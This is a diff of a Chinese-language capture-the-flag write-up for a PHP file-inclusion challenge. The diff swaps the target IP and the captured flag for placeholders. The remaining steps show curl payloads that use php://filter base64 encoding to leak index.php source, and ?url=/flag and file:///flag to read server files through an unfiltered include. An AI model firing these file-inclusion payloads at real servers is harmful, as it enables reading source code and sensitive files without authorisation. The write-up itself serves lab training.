@@ -2,7 +2,7 @@
 
 ## 题目
 
-- 地址：`http://47.120.76.57:34289`
+- 地址：`http://目标地址`
 - 目标：拿到 `TOGOGO-flag{}`
 - 关键点：`RFI / 文件包含 / PHP wrapper 绕过`
 
@@ -22,7 +22,7 @@ source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
 ### 2. 打开首页看提示
 
 ```bash
-curl -i 'http://47.120.76.57:34289/'
+curl -i 'http://目标地址/'
 ```
 
 能看到类似提示：
@@ -38,13 +38,13 @@ Flag 文件位置：/flag
 ### 3. 用 php://filter 读取源码确认漏洞
 
 ```bash
-curl 'http://47.120.76.57:34289/?url=php://filter/convert.base64-encode/resource=index.php'
+curl 'http://目标地址/?url=php://filter/convert.base64-encode/resource=index.php'
 ```
 
 返回是一段 Base64，解码：
 
 ```bash
-curl -s 'http://47.120.76.57:34289/?url=php://filter/convert.base64-encode/resource=index.php' | base64 -d
+curl -s 'http://目标地址/?url=php://filter/convert.base64-encode/resource=index.php' | base64 -d
 ```
 
 关键源码：
@@ -62,19 +62,19 @@ include $url;
 ### 4. 直接包含 /flag
 
 ```bash
-curl 'http://47.120.76.57:34289/?url=/flag'
+curl 'http://目标地址/?url=/flag'
 ```
 
 得到：
 
 ```text
-TOGOGO-flag{7b01efbe-6823-46e6-a95d-bc79fede36b3}
+TOGOGO-flag{}
 ```
 
 也可以用 `file://`：
 
 ```bash
-curl 'http://47.120.76.57:34289/?url=file:///flag'
+curl 'http://目标地址/?url=file:///flag'
 ```
 
 ## 运行脚本
@@ -88,7 +88,7 @@ python3 main.py
 预期输出：
 
 ```text
-[+] FLAG: TOGOGO-flag{7b01efbe-6823-46e6-a95d-bc79fede36b3}
+[+] FLAG: TOGOGO-flag{}
 ```
 
 ## 漏洞原因
@@ -103,5 +103,5 @@ python3 main.py
 ## Flag
 
 ```text
-TOGOGO-flag{7b01efbe-6823-46e6-a95d-bc79fede36b3}
+TOGOGO-flag{}
 ```
